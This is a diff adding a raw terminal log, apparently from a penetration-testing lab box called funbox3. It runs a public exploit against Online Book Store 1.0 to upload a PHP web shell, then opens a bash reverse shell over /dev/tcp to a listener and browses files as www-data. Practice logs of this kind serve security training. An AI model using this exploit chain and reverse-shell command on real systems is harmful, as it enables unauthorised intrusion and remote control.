@@ -1,0 +1,70 @@
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# curl http://192.168.167.111/robots.txt        
+Disallow: gym
+                                                                                                                     
+
+http://192.168.167.111/store/
+
+┌──(root㉿kali)-[/home/kali]
+└─# searchsploit -m php/webapps/47887.py
+  Exploit: Online Book Store 1.0 - Unauthenticated Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/47887
+     Path: /usr/share/exploitdb/exploits/php/webapps/47887.py
+    Codes: N/A
+ Verified: True
+File Type: ASCII text
+Copied to: /home/kali/47887.py
+
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# python3 47887.py                                                                                          
+usage: 47887.py [-h] url
+47887.py: error: the following arguments are required: url
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# python3 47887.py http://192.168.167.111/store/ 
+> Attempting to upload PHP web shell...
+> Verifying shell upload...
+> Web shell uploaded to http://192.168.167.111/store/bootstrap/img/wo9Q9czDZD.php
+> Example command usage: http://192.168.167.111/store/bootstrap/img/wo9Q9czDZD.php?cmd=whoami
+> Do you wish to launch a shell here? (y/n): y
+RCE $ 
+RCE $ bash -c "bash -i >& /dev/tcp/192.168.45.210/4444 0>&1"
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 4444                 
+listening on [any] 4444 ...
+connect to [192.168.45.210] from (UNKNOWN) [192.168.167.111] 56688
+bash: cannot set terminal process group (834): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@funbox3:/var/www/html/store/bootstrap/img$ cd ..
+
+www-data@funbox3:/var/www/html/secret$ ls
+ls
+changelog.txt
+index.php
+robots.txt
+www-data@funbox3:/var/www/html/secret$ cat changelog.txt
+cat changelog.txt
+„Everyone is trying to accomplish something big, not realizing that life is made up of little things.“
+Frank Clark (*1860 - †1936)
+www-data@funbox3:/var/www/html/secret$ cat index.php
+cat index.php
+„Anyone who lives within their means suffers from a lack of imagination.“
+Oscar Wilde (*1854 - †1900)
+www-data@funbox3:/var/www/html/secret$ cat robots.txt
+cat robots.txt
+Allow: Pentesting
+Disallow: Cancel
+www-data@funbox3:/var/www/html/secret$ 
+
+
+
+
+
+
+
+
